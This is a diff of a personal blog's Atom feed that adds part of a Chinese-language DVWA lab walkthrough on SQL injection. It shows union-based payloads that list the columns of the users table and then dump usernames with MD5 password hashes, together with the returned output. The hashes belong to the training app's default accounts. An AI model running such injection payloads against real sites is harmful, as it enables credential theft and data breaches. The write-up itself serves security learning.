@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-12T14:50:27.296Z</updated>
+    <updated>2021-04-12T14:52:16.654Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -194,6 +194,48 @@ First name: users
 Surname: dvwa
 </code></pre>
 <p>总结：编码既然不统一，那就让数据库自己解决，先hex再unhex，至于解码出来的是啥就看数据库咋想的了</p>
+<p>当然为了后续的学习的方便，最后还是将编码统一了（删库重建</p>
+<h3 id="获取列名">获取列名</h3>
+<p>输入</p>
+<pre><code>1' union select 1,group_concat(column_name) from information_schema.columns where
+table_name='users' #
+</code></pre>
+<blockquote>
+<p>group_concat()一次性列出</p>
+<p>这里是一次性列出column_name</p>
+</blockquote>
+<p>返回</p>
+<pre><code>ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+First name: admin
+Surname: admin
+ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+First name: 1
+Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+</code></pre>
+<h3 id="获取数据">获取数据</h3>
+<p>输入</p>
+<pre><code>1' union select user,password from users#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select user,password from users#
+First name: admin
+Surname: admin
+ID: 1' union select user,password from users#
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: 1' union select user,password from users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 1' union select user,password from users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 1' union select user,password from users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 1' union select user,password from users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
 ]]></content>
     </entry>
     <entry>
